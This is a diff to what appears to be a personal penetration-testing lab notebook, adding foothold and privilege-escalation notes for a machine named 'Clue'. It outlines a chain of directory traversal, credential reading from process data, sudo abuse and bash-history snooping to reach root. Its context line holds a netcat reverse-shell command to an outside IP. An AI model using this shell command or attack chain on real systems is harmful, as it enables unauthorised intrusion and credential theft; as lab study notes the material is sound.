@@ -123,7 +123,14 @@ os.system('nc 192.168.45.175 80 -e /bin/sh')
 **Clue**
   Foothold:
     - Cassandra Exploit: directory traversal
-    - 
+    - from proc/self/cmdline, we found cassie's name and password -> didn't work for ssh
+    - FreeSWITCH mod_event_socket was running so tried exploit and didn't work because password is different
+    - Found FreeSWITCH mod_event_socket password through cassandra's exploit
+  PrivEsc: pivoting twice
+    - Switch user as cassie
+    - cassie can run cassandra-web with sudo privilege. since it's running with root privilege, we can grab anything as root
+    - Read .bash_history of anthony and figure out that he can login into ssh as root
+    - Shell as root
 
 **Law**
   Foothold:
